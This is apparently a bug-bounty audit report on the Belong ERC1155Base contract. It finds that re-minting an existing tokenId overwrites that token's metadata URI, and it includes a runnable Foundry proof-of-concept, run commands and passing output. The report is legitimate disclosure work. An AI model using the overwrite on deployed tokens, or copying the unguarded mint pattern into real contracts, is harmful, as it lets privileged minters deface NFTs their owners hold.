# 57902 sc insight erc1155base re mint overwrites token uri allowing post issuance nft alteration griefing

**Submitted on Oct 29th 2025 at 12:18:36 UTC by @manvi for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57902
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/base/ERC1155Base.sol>
* **Impacts:**
  * Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

I analyzed the ERC-1155 flow and observed that calling `mint(...)` on an already-minted `tokenId` silently replaces its metadata URI. This allows any address with the `MINTER_ROLE` to rewrite what an NFT represents after it's in circulation, enabling griefing and breaking metadata immutability guarantees.

### Vulnerability Details

Root cause is in `contracts/v2/tokens/base/ERC1155Base.sol`: `mint` unconditionally calls `_setTokenUri(tokenId, tokenUri)` before `_mint`, with no guard that the `tokenId` is new or that existing URIs are immutable.

```
function mint(address to, uint256 tokenId, uint256 amount, string calldata tokenUri)
    public
    onlyRoles(MINTER_ROLE)
{
    _setTokenUri(tokenId, tokenUri);   // <-- overwrites even if tokenId already exists
    _mint(to, tokenId, amount, "0x");
}
```

There is no "first-write wins" check (e.g., `require` empty URI) and no separate "set-once" path. As a result, any subsequent mint of the same `tokenId` lets the minter replace the URI at will.

### Impact Details

* Unintended alteration of what the NFT represents (token URI/content replacement) after distribution.
* A malicious/compromised minter can vandalize metadata for already-owned tokens (e.g., point to broken/offensive content), harming users & brand.
* If off-chain marketplaces assume immutability, this can cause trust and valuation issues.

## References

* **Contract:** contracts/v2/tokens/base/ERC1155Base.sol
* **Related state:** `_tokenUri[tokenId]` set without immutability checks.

## Proof of Concept

I have written a runnable POC to demonstrate this issue.

POC file location: `poc/PoC_ERC1155_MetadataOverwrite.t.sol`

### What my POC does

* Mints `tokenId = 1` to a user with URI `ipfs://original`.
* Re-mints the same `tokenId = 1` to the same user with a different URI `ipfs://malicious`.
* Asserts that `uri(1)` is now `ipfs://malicious` → metadata overwritten (griefing / misrepresentation).

<details>

<summary>POC file content</summary>

```solidity
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CreditToken} from "contracts/v2/tokens/CreditToken.sol";
import {ERC1155Info} from "contracts/v2/Structures.sol";

/**
 * PoC: MINTER_ROLE can overwrite an existing token's metadata URI by     re-minting the same tokenId.
 * Impact: "Unintended alteration of what the NFT represents".
 */
contract PoC_ERC1155_MetadataOverwrite is Test {
    CreditToken internal credit;

    // Use only hex digits (0-9, a-f) in address literals.
    address admin   = address(0xA11CE);  // ok: hex
    address manager = address(0xA11A9E); // ok: hex
    address minter  = address(0xBEEF1);  // ok: hex
    address burner  = address(0xB0B01);  // ok: hex (replaces 0xB0RN0)
    address buyer   = address(0xCAFE0);  // ok: hex

    function setUp() public {
        vm.startPrank(admin);

        credit = new CreditToken();

        ERC1155Info memory info = ERC1155Info({
            defaultAdmin: admin,
            manager:      manager,
            minter:       minter,
            burner:       burner,
            uri:          "ipfs://COLLECTION-URI",
            transferable: true,
            name:         "Belong Credits",
            symbol:       "BLGCR"
        });

        credit.initialize(info);
        vm.stopPrank();
    }

    function test_overwrite_token_uri_of_existing_tokenId() public {
        uint256 tokenId = 1;

        // Initial mint sets "GOOD" metadata
        vm.prank(minter);
        credit.mint(buyer, tokenId, 1, "ipfs://GOOD-METADATA");
        assertEq(credit.uri(tokenId), "ipfs://GOOD-METADATA", "sanity: initial URI");

        // Re-mint SAME tokenId with a different URI - no manager role required
        vm.prank(minter);
        credit.mint(buyer, tokenId, 1, "ipfs://EVIL-METADATA");

        //  Vulnerable behavior: URI overwritten by MINTER_ROLE
        assertEq(credit.uri(tokenId), "ipfs://EVIL-METADATA", "URI should be overwritten by minter re-mint");
    }
}
```

</details>

### Run My POC

<details>

<summary>Commands to run POC</summary>

```
forge clean
forge test -vv --match-test overwrite_token_uri_of_existing_tokenId
```

</details>

### My Console Output

<details>

<summary>Output from running the test</summary>

```
[⠊] Compiling...
[⠃] Compiling 32 files with Solc 0.8.27
[⠊] Solc 0.8.27 finished in 7.94s
Compiler run successful!

Ran 1 test for      poc/PoC_ERC1155_MetadataOverwrite.t.sol:PoC_ERC1155_MetadataOver    write
[PASS] test_overwrite_token_uri_of_existing_tokenId() (gas: 84148)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.18ms (591.56µs    CPU time)
```

</details>

## What my POC proves

* Re-minting the same `tokenId` updates the internal `_tokenUri[tokenId]`.
* The NFT's displayed content can be changed after distribution by any address with `MINTER_ROLE`.
* This enables unintended alteration of what the NFT represents and griefing.

Note: If there are any compatibility issues while running the POC please let me know.
